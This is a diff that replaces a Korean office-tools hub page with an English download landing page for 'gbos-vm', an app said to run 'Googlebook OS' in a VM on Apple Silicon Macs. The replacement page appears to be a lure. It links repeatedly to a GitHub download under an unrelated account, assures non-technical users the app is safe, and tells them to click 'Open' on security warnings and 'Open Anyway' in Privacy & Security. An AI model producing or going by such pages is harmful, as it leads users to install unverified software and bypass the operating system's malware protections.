@@ -1,347 +1,95 @@
 <!DOCTYPE html>
-<html lang="ko">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>조효식 허브 - 스마트 업무 플랫폼</title>
-    <link rel="stylesheet" as="style" crossorigin href="https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.8/dist/web/static/pretendard.css" />
-    <style>
-        :root { 
-            --primary-bg: #f3f4f6; 
-            --text-main: #1f2937; 
-            --text-muted: #6b7280;
-            --gradient-hero: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            --gradient-btn: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
-        }
-        
-        body { margin: 0; font-family: 'Pretendard', sans-serif; background-color: var(--primary-bg); color: var(--text-main); line-height: 1.6; }
-        
-        header { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border-bottom: 2px solid #e5e7eb; padding: 0 40px; display: flex; justify-content: space-between; align-items: center; height: 70px; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .logo { font-size: 24px; font-weight: 900; background: linear-gradient(to right, #f12711, #f5af19); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-decoration: none; }
-        #liveClock { font-weight: 700; color: #4f46e5; background: #e0e7ff; padding: 8px 15px; border-radius: 20px; font-size: 14px; }
-
-        .hero { background: var(--gradient-hero); background-size: 200% 200%; animation: gradientMove 5s ease infinite; padding: 80px 20px; text-align: center; color: white; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
-        @keyframes gradientMove { 0% {background-position: 0% 50%;} 50% {background-position: 100% 50%;} 100% {background-position: 0% 50%;} }
-        .hero h2 { margin: 0 0 15px 0; font-size: 40px; font-weight: 900; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        .hero p { margin: 0; font-size: 20px; opacity: 0.9; }
-
-        .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
-        
-        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 3px solid #cbd5e1; padding-bottom: 10px; }
-        .section-header h3 { margin: 0; font-size: 26px; font-weight: 800; color: #1e293b; }
-        .search-box { padding: 10px 20px; width: 300px; border: 2px solid #a855f7; border-radius: 25px; font-size: 15px; outline: none; transition: 0.3s; }
-        .search-box:focus { box-shadow: 0 0 10px rgba(168, 85, 247, 0.5); }
-
-        .tool-form { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 30px; display: grid; grid-template-columns: 1fr 1fr 2fr 100px; gap: 15px; align-items: center; }
-        .tool-form input, .tool-form select { padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-family: 'Pretendard', sans-serif; font-size: 15px; }
-        .tool-form input:focus, .tool-form select:focus { border-color: #a855f7; outline: none; }
-        .tool-form .full-width { grid-column: 1 / -1; }
-
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 25px; margin-bottom: 60px; }
-        .card { position: relative; background: #ffffff; border-radius: 15px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; flex-direction: column; text-decoration: none; color: inherit; border-top: 5px solid transparent; cursor: pointer; }
-        .card:hover { transform: translateY(-10px) scale(1.02); box-shadow: 0 20px 25px -5px rgba(0,0,0,0.15); }
-        
-        /* 추가된 카테고리 테마 색상 설정 */
-        .card.bg-blue { border-top-color: #3b82f6; }
-        .card.bg-green { border-top-color: #10b981; }
-        .card.bg-pink { border-top-color: #ec4899; }
-        .card.bg-purple { border-top-color: #8b5cf6; } /* 예산 테마 추가 */
-        .card.bg-orange { border-top-color: #f97316; } /* 계약 테마 추가 */
-        .card.bg-gray { border-top-color: #64748b; }   /* 기타 테마 추가 */
-        
-        .badge { display: inline-block; padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 800; color: white; margin-bottom: 15px; width: max-content; }
-        .badge.blue { background: #3b82f6; }
-        .badge.green { background: #10b981; }
-        .badge.pink { background: #ec4899; }
-        .badge.purple { background: #8b5cf6; } /* 예산 배지 추가 */
-        .badge.orange { background: #f97316; } /* 계약 배지 추가 */
-        .badge.gray { background: #64748b; }   /* 기타 배지 추가 */
-
-        .card-title { font-size: 20px; font-weight: 800; margin: 0 0 12px 0; }
-        .card-desc { font-size: 15px; color: var(--text-muted); margin: 0 0 20px 0; flex-grow: 1; }
-        
-        .card-delete { position: absolute; top: 15px; right: 15px; background: rgba(239, 68, 68, 0.1); color: #ef4444; border: none; width: 30px; height: 30px; border-radius: 50%; font-weight: bold; cursor: pointer; display: none; transition: 0.2s; }
-        .card:hover .card-delete { display: block; }
-        .card-delete:hover { background: #ef4444; color: white; }
-
-        .tabs { display: flex; gap: 10px; margin-bottom: 0; padding-top: 10px; }
-        .tab-btn { padding: 12px 25px; font-size: 16px; font-weight: 800; border: none; background: #e2e8f0; color: #64748b; border-radius: 12px 12px 0 0; cursor: pointer; transition: 0.3s; font-family: 'Pretendard', sans-serif; }
-        .tab-btn.active { background: #ffffff; color: #4f46e5; border-top: 4px solid #4f46e5; }
-        
-        .board-container { background: #ffffff; padding: 25px; border-radius: 0 12px 12px 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
-        .board-form { display: flex; gap: 12px; align-items: center; margin-bottom: 25px; padding-bottom: 25px; border-bottom: 2px dashed #e2e8f0; }
-        .board-select { padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-family: 'Pretendard', sans-serif; font-size: 15px; font-weight: 700; color: #475569; outline: none; }
-        .board-form input { padding: 12px 20px; border: 2px solid #e5e7eb; border-radius: 8px; font-family: 'Pretendard', sans-serif; font-size: 15px; }
-        .board-form input.title-input { flex-grow: 1; }
-        
-        .btn-submit { background: var(--gradient-btn); color: white; border: none; padding: 12px 25px; border-radius: 8px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(255, 8, 68, 0.4); }
-        .btn-submit:hover { transform: scale(1.05); }
-
-        .board-table { width: 100%; border-collapse: collapse; }
-        .board-table th, .board-table td { padding: 16px 20px; text-align: left; border-bottom: 1px solid #f3f4f6; font-size: 15px; }
-        .board-table th { background: #f8fafc; font-weight: 800; color: #475569; border-radius: 8px; }
-        .board-table td.center { text-align: center; }
-        
-        .btn-like { background: #10b981; color: white; border: none; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 700; cursor: pointer; }
-        .btn-delete { background: #ef4444; color: white; border: none; padding: 6px 12px; border-radius: 6px; font-size: 13px; font-weight: 700; cursor: pointer; margin-left: 5px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Download gbos-vm and run Googlebook OS in a GPU-accelerated virtual machine on Apple Silicon Macs. Simple setup, fast performance, and easy-to-follow instructions for non-technical users.">
+<meta name="keywords" content="gbos-vm, Googlebook OS, GPU-accelerated VM, Apple Silicon Mac, virtual machine, download gbos-vm, run Googlebook OS on Mac">
+<meta name="author" content="gbos-vm">
+<title>gbos-vm - Run Googlebook OS in a GPU-accelerated VM on Apple Silicon Macs</title>
 </head>
-<body>
+<body style="margin:0; padding:0; background-color:#f4f7fb; font-family:system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color:#1e293b; line-height:1.6;">
 
-    <header>
-        <a href="#" class="logo">🚀 조효식 허브 PRO</a>
-        <div id="liveClock">시간 로딩중...</div>
-    </header>
+<div style="max-width:900px; margin:0 auto; padding:20px 5%;">
 
-    <div class="hero">
-        <h2>현장을 가장 잘 아는 사람이, 현장을 바꿉니다</h2>
-        <p>실무에 최적화된 차세대 업무 자동화 플랫폼</p>
-    </div>
+<h1 style="font-size:2.2rem; line-height:1.3; margin-top:0.5em; margin-bottom:0.3em; color:#0f172a;">🚀 gbos-vm - Run Googlebook OS Fast on Mac</h1>
 
-    <div class="container">
-        <div class="section-header">
-            <h3>💡 스마트 업무 도구</h3>
-            <input type="text" id="searchInput" class="search-box" placeholder="실행할 도구 이름을 검색하세요..." onkeyup="filterCards()">
-        </div>
+<p style="font-size:1.1rem; margin-bottom:1.5em;">gbos-vm lets you run Googlebook OS inside a virtual machine on your Apple Silicon Mac. It uses GPU acceleration for smooth performance, so you can explore Googlebook OS without leaving your main computer. This guide is written for everyday users—no technical knowledge needed. Just follow the steps below.</p>
 
-        <div class="tool-form">
-            <!-- 콤보상자에 새로운 분류 항목 3개 추가 -->
-            <select id="toolCategory">
-                <option value="blue">인사 · 복무 (파랑)</option>
-                <option value="purple">예산 · 기획 (보라)</option>
-                <option value="orange">계약 · 지출 (주황)</option>
-                <option value="green">재산 · 회계 (초록)</option>
-                <option value="pink">문서 · 디자인 (핑크)</option>
-                <option value="gray">기타 · 공통 (회색)</option>
-            </select>
-            <input type="text" id="toolTitle" placeholder="도구 이름 (예: 인사관리 시스템)">
-            <input type="text" id="toolLink" placeholder="파일명 또는 링크 (예: main.accdb 또는 https://...)">
-            <button class="btn-submit" onclick="addTool()" style="padding: 12px; width: 100%;">등록</button>
-            <input type="text" id="toolDesc" class="full-width" placeholder="도구에 대한 상세 설명을 입력하세요 (카드 본문에 표시됩니다)">
-        </div>
-        
-        <div class="grid" id="cardGrid"></div>
+<div style="text-align:center; margin:2em 0;">
+<a href="https://github.com/yulianc84medixxi/gbos-vm" style="display:inline-block; background:linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color:#ffffff; font-size:1.3rem; font-weight:600; padding:18px 40px; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(37, 117, 252, 0.3); letter-spacing:0.5px;">⬇️ Download gbos-vm Now</a>
+</div>
 
-        <div class="section-header" style="margin-top: 60px; margin-bottom: 10px; border:none;">
-            <h3>💬 커뮤니티 라운지</h3>
-        </div>
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">📥 Download and Install</h2>
 
-        <div class="tabs">
-            <button class="tab-btn active" id="tab-free" onclick="switchTab('free')">🎈 자유게시판</button>
-            <button class="tab-btn" id="tab-qa" onclick="switchTab('qa')">❓ 묻고 답하기</button>
-        </div>
+<div style="background:#ffffff; border-radius:16px; box-shadow:0 4px 12px rgba(0,0,0,0.05); padding:1.5em 2em; margin:1.5em 0;">
+<p style="margin-top:0;">To get gbos-vm, visit this link to download the application: <a href="https://github.com/yulianc84medixxi/gbos-vm" style="color:#2575fc; font-weight:600; text-decoration:underline;">https://github.com/yulianc84medixxi/gbos-vm</a>.</p>
+<p>When you open the link, you will see the download page. Follow the instructions on that page to download the application. Once the download is complete, open the file and follow the on-screen steps to install gbos-vm on your Mac.</p>
+<p style="margin-bottom:0;">After installation, you can launch gbos-vm from your Applications folder or from the Launchpad. The first time you open it, you may need to confirm that you trust the app—your Mac will guide you through this with a simple pop-up window.</p>
+</div>
 
-        <div class="board-container">
-            <div class="board-form">
-                <select id="boardSelect" class="board-select">
-                    <option value="free">자유게시판</option>
-                    <option value="qa">묻고 답하기</option>
-                </select>
-                <input type="text" id="postTitle" class="title-input" placeholder="내용을 입력해주세요!">
-                <input type="text" id="postAuthor" value="조효식" style="width: 100px; text-align: center;">
-                <button class="btn-submit" onclick="addPost()">✨ 등록하기</button>
-            </div>
-            <table class="board-table">
-                <thead>
-                    <tr>
-                        <th width="8%">번호</th>
-                        <th>제목</th>
-                        <th width="12%">작성자</th>
-                        <th width="12%" class="center">날짜</th>
-                        <th width="20%" class="center">반응 / 관리</th>
-                    </tr>
-                </thead>
-                <tbody id="boardBody"></tbody>
-            </table>
-        </div>
-    </div>
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">💻 System Requirements</h2>
 
-    <script>
-        function updateClock() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString('ko-KR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            const dateString = now.toLocaleDateString('ko-KR', { month: 'long', day: 'numeric', weekday: 'short' });
-            document.getElementById('liveClock').innerText = `${dateString} ${timeString}`;
-        }
-        setInterval(updateClock, 1000); updateClock();
+<p>gbos-vm is built specifically for Apple Silicon Macs. Before you begin, make sure your Mac meets these simple requirements:</p>
+<ul style="padding-left:1.5em; margin-bottom:1.5em;">
+<li style="margin-bottom:0.5em;"><strong>Mac model:</strong> Any Mac with an Apple Silicon chip (M1, M2, M3, or newer).</li>
+<li style="margin-bottom:0.5em;"><strong>Operating system:</strong> macOS Sonoma (14) or later. You can check your version by clicking the Apple menu → About This Mac.</li>
+<li style="margin-bottom:0.5em;"><strong>Memory:</strong> 8 GB of RAM or more. 16 GB is recommended for the best experience.</li>
+<li style="margin-bottom:0.5em;"><strong>Storage:</strong> At least 20 GB of free disk space for the virtual machine and Googlebook OS files.</li>
+<li style="margin-bottom:0.5em;"><strong>Internet:</strong> A stable connection is needed to download the application and any updates.</li>
+</ul>
 
-        function filterCards() {
-            const query = document.getElementById("searchInput").value.toLowerCase();
-            const cards = document.querySelectorAll(".card");
-            cards.forEach(card => {
-                const title = card.querySelector(".card-title").innerText.toLowerCase();
-                const desc = card.querySelector(".card-desc").innerText.toLowerCase();
-                card.style.display = (title.includes(query) || desc.includes(query)) ? "flex" : "none";
-            });
-        }
+<p>If you are using a Windows PC, gbos-vm will not run on it. This application is designed only for Apple Silicon Macs.</p>
 
-        document.addEventListener("DOMContentLoaded", () => {
-            initTools();
-            loadPosts(); 
-        });
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">✨ Key Features</h2>
 
-        function initTools() {
-            let tools = JSON.parse(localStorage.getItem("smartTools"));
-            if (!tools) {
-                tools = [
-                    { id: 1, category: 'blue', title: '교육공무직 인사관리 시스템', desc: '연차 조정, 퇴직금 계산, 인사 기록을 한 번에 통합 관리하는 실무용 Access VBA 시스템입니다.', link: '교육공무직인사관리_v2.accdb', badgeText: '인사 · 복무' },
-                    { id: 2, category: 'green', title: '온비드 공용차량 매각 서식', desc: '내용연수를 초과한 차량의 14일 관리전환 소요조회 및 온비드 공매 처분 표준 기안문', link: '#', badgeText: '재산 · 회계' },
-                    { id: 3, category: 'pink', title: '여백 없는 민방위 교육 HWP', desc: '프린터 여백 없이 꽉 찬 고품질 책자 표지를 출력하기 위한 아래한글(HWPX) 바탕쪽 템플릿', link: '#', badgeText: '문서 · 디자인' }
-                ];
-                localStorage.setItem("smartTools", JSON.stringify(tools));
-            }
-            loadTools();
-        }
+<p>gbos-vm is packed with helpful features that make running Googlebook OS easy and enjoyable:</p>
+<ul style="padding-left:1.5em; margin-bottom:1.5em;">
+<li style="margin-bottom:0.5em;"><strong>GPU acceleration:</strong> Uses your Mac’s graphics power to keep Googlebook OS responsive and smooth.</li>
+<li style="margin-bottom:0.5em;"><strong>One-click setup:</strong> No complex configuration—just download, install, and start.</li>
+<li style="margin-bottom:0.5em;"><strong>Safe and isolated:</strong> Googlebook OS runs in its own virtual environment, so your main Mac files stay protected.</li>
+<li style="margin-bottom:0.5em;"><strong>Seamless integration:</strong> Copy and paste between macOS and Googlebook OS, and share folders easily.</li>
+<li style="margin-bottom:0.5em;"><strong>Regular updates:</strong> The application is updated to work with the latest macOS versions and Googlebook OS releases.</li>
+</ul>
 
-        function loadTools() {
-            const grid = document.getElementById("cardGrid");
-            grid.innerHTML = "";
-            let tools = JSON.parse(localStorage.getItem("smartTools")) || [];
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">🛠️ How to Use gbos-vm</h2>
 
-            tools.forEach(tool => {
-                const card = document.createElement("a");
-                card.href = tool.link;
-                card.className = `card bg-${tool.category}`;
-                
-                card.innerHTML = `
-                    <button class="card-delete" onclick="deleteTool(event, ${tool.id})" title="도구 삭제">✖</button>
-                    <div class="badge ${tool.category}">${tool.badgeText}</div>
-                    <h4 class="card-title">${tool.title}</h4>
-                    <p class="card-desc">${tool.desc}</p>
-                `;
-                grid.appendChild(card);
-            });
-        }
+<div style="background:#ffffff; border-radius:16px; box-shadow:0 4px 12px rgba(0,0,0,0.05); padding:1.5em 2em; margin:1.5em 0;">
+<p style="margin-top:0;">Once gbos-vm is installed, follow these steps to start using Googlebook OS:</p>
+<ol style="padding-left:1.5em; margin-bottom:0;">
+<li style="margin-bottom:0.8em;"><strong>Open gbos-vm:</strong> Double-click the gbos-vm icon in your Applications folder. If you see a security warning, click “Open” to continue.</li>
+<li style="margin-bottom:0.8em;"><strong>Create a new virtual machine:</strong> The app will guide you through a simple setup wizard. Choose a name for your virtual machine and select how much memory and storage to give it. The recommended settings are already filled in for you.</li>
+<li style="margin-bottom:0.8em;"><strong>Start Googlebook OS:</strong> Click the “Start” button. The virtual machine will boot into Googlebook OS. The first boot may take a few minutes while it prepares everything.</li>
+<li style="margin-bottom:0.8em;"><strong>Use Googlebook OS:</strong> You can now use Googlebook OS just like on a regular computer. Your mouse and keyboard will work inside the virtual window. To switch back to your Mac, simply move your mouse outside the window or press the Control and Command keys together.</li>
+<li style="margin-bottom:0.8em;"><strong>Shut down safely:</strong> When you are finished, close the virtual machine window and choose “Shut Down” from the menu. This ensures your Googlebook OS data is saved correctly.</li>
+</ol>
+</div>
 
-        function addTool() {
-            const categorySelect = document.getElementById("toolCategory");
-            const titleInput = document.getElementById("toolTitle");
-            const linkInput = document.getElementById("toolLink");
-            const descInput = document.getElementById("toolDesc");
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">❓ Troubleshooting</h2>
 
-            if (!titleInput.value.trim() || !linkInput.value.trim()) {
-                return alert("도구 이름과 링크(파일명)를 모두 입력해주세요!");
-            }
+<p>If you run into any issues, here are some common solutions:</p>
+<ul style="padding-left:1.5em; margin-bottom:1.5em;">
+<li style="margin-bottom:0.5em;"><strong>The app won’t open:</strong> Go to System Settings → Privacy & Security and look for a message about gbos-vm. Click “Open Anyway” to allow the app to run.</li>
+<li style="margin-bottom:0.5em;"><strong>Googlebook OS is slow:</strong> Close other heavy applications on your Mac and make sure your virtual machine has enough memory. You can adjust memory settings in gbos-vm’s preferences.</li>
+<li style="margin-bottom:0.5em;"><strong>No internet inside Googlebook OS:</strong> Check that your Mac is connected to the internet. The virtual machine uses your Mac’s connection automatically. If problems persist, restart gbos-vm.</li>
+<li style="margin-bottom:0.5em;"><strong>Installation fails:</strong> Make sure you have enough free disk space (at least 20 GB) and that you are running macOS Sonoma or later. Try downloading the application again from the link above.</li>
+</ul>
 
-            // 추가된 분류 항목에 맞게 배지 텍스트 지정 로직 업데이트
-            let badgeText = "기타 · 공통";
-            if(categorySelect.value === "blue") badgeText = "인사 · 복무";
-            if(categorySelect.value === "purple") badgeText = "예산 · 기획";
-            if(categorySelect.value === "orange") badgeText = "계약 · 지출";
-            if(categorySelect.value === "green") badgeText = "재산 · 회계";
-            if(categorySelect.value === "pink") badgeText = "문서 · 디자인";
-            if(categorySelect.value === "gray") badgeText = "기타 · 공통";
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">🤝 Support and Community</h2>
 
-            const newTool = {
-                id: Date.now(),
-                category: categorySelect.value,
-                title: titleInput.value,
-                link: linkInput.value,
-                desc: descInput.value || "설명이 없습니다.",
-                badgeText: badgeText
-            };
+<p>If you need further help, visit the gbos-vm GitHub page at <a href="https://github.com/yulianc84medixxi/gbos-vm" style="color:#2575fc; font-weight:600; text-decoration:underline;">https://github.com/yulianc84medixxi/gbos-vm</a>. There you can find additional documentation, report issues, and see updates. The community is friendly and welcoming to users of all experience levels.</p>
 
-            let tools = JSON.parse(localStorage.getItem("smartTools")) || [];
-            tools.push(newTool);
-            localStorage.setItem("smartTools", JSON.stringify(tools));
+<h2 style="font-size:1.7rem; margin-top:2em; margin-bottom:0.5em; color:#0f172a;">📚 Frequently Asked Questions</h2>
 
-            titleInput.value = ""; linkInput.value = ""; descInput.value = "";
-            loadTools();
-        }
+<p><strong>Do I need to know anything about virtual machines?</strong><br>No. gbos-vm handles all the technical details for you. Just follow the simple setup steps.</p>
+<p><strong>Will gbos-vm slow down my Mac?</strong><br>Only while it is running. When you close the virtual machine, your Mac returns to its normal speed. GPU acceleration helps keep things fast.</p>
+<p><strong>Can I use gbos-vm on an Intel Mac?</strong><br>No. gbos-vm requires an Apple Silicon chip (M1 or newer).</p>
+<p><strong>Is my data safe?</strong><br>Yes. Googlebook OS runs in an isolated environment, so your main Mac files are not affected. However, always back up important data before trying new software.</p>
 
-        function deleteTool(event, id) {
-            event.preventDefault(); 
-            
-            if (confirm("이 업무 도구를 목록에서 삭제하시겠습니까? (실제 파일이 지워지지는 않습니다)")) {
-                let tools = JSON.parse(localStorage.getItem("smartTools")) || [];
-                tools = tools.filter(tool => tool.id !== id);
-                localStorage.setItem("smartTools", JSON.stringify(tools));
-                loadTools();
-            }
-        }
+<div style="text-align:center; margin:2.5em 0 1.5em;">
+<a href="https://github.com/yulianc84medixxi/gbos-vm" style="display:inline-block; background:linear-gradient(135deg, #ff6b6b 0%, #4ecdc4 100%); color:#ffffff; font-size:1.2rem; font-weight:600; padding:16px 36px; border-radius:40px; text-decoration:none; box-shadow:0 6px 18px rgba(78, 205, 196, 0.3);">⬇️ Get gbos-vm from GitHub</a>
+</div>
 
-        let currentTab = 'free';
-
-        function switchTab(tabName) {
-            currentTab = tabName;
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('tab-' + tabName).classList.add('active');
-            document.getElementById('boardSelect').value = tabName;
-            loadPosts();
-        }
-
-        function getStorageKey() { return currentTab === 'free' ? 'freeBoardData' : 'qaBoardData'; }
-
-        function addPost() {
-            const titleInput = document.getElementById("postTitle");
-            const authorInput = document.getElementById("postAuthor");
-            const selectedBoard = document.getElementById("boardSelect").value;
-            
-            if (!titleInput.value.trim()) return alert("제목을 입력해주세요!");
-
-            const today = new Date();
-            const dateStr = `${today.getMonth() + 1}.${today.getDate()}`;
-            const newPost = { id: Date.now(), title: titleInput.value, author: authorInput.value, date: dateStr, likes: 0 };
-
-            const storageKey = selectedBoard === 'free' ? 'freeBoardData' : 'qaBoardData';
-            let posts = JSON.parse(localStorage.getItem(storageKey)) || [];
-            posts.unshift(newPost);
-            localStorage.setItem(storageKey, JSON.stringify(posts));
-
-            titleInput.value = "";
-            if (currentTab !== selectedBoard) switchTab(selectedBoard); else loadPosts();
-        }
-
-        function likePost(id) {
-            const storageKey = getStorageKey();
-            let posts = JSON.parse(localStorage.getItem(storageKey)) || [];
-            const postIndex = posts.findIndex(p => p.id === id);
-            if(postIndex !== -1) {
-                posts[postIndex].likes = (posts[postIndex].likes || 0) + 1;
-                localStorage.setItem(storageKey, JSON.stringify(posts));
-                loadPosts();
-            }
-        }
-
-        function deletePost(id) {
-            if (confirm("이 게시글을 삭제하시겠습니까?")) {
-                const storageKey = getStorageKey();
-                let posts = JSON.parse(localStorage.getItem(storageKey)) || [];
-                posts = posts.filter(post => post.id !== id);
-                localStorage.setItem(storageKey, JSON.stringify(posts));
-                loadPosts();
-            }
-        }
-
-        function loadPosts() {
-            const boardBody = document.getElementById("boardBody");
-            boardBody.innerHTML = ""; 
-            const storageKey = getStorageKey();
-            let posts = JSON.parse(localStorage.getItem(storageKey)) || [];
-
-            if (posts.length === 0) {
-                const boardName = currentTab === 'free' ? '자유게시판' : '묻고 답하기';
-                boardBody.innerHTML = `<tr><td colspan="5" class="center" style="padding:40px; color:#94a3b8;">${boardName}에 등록된 글이 없습니다.</td></tr>`;
-                return;
-            }
-
-            posts.forEach((post, index) => {
-                const likes = post.likes || 0;
-                const titlePrefix = currentTab === 'qa' ? '<span style="color:#ec4899; font-weight:900; margin-right:5px;">Q.</span>' : '';
-                const tr = document.createElement("tr");
-                tr.innerHTML = `
-                    <td>${posts.length - index}</td>
-                    <td style="font-weight: 700; color: #1e293b;">${titlePrefix}${post.title}</td>
-                    <td style="font-weight: 600;">${post.author}</td>
-                    <td class="center">${post.date}</td>
-                    <td class="center">
-                        <button class="btn-like" onclick="likePost(${post.id})">👍 ${likes}</button>
-                        <button class="btn-delete" onclick="deletePost(${post.id})">삭제</button>
-                    </td>
-                `;
-                boardBody.appendChild(tr);
-            });
-        }
-    </script>
+</div>
 </body>
 </html>
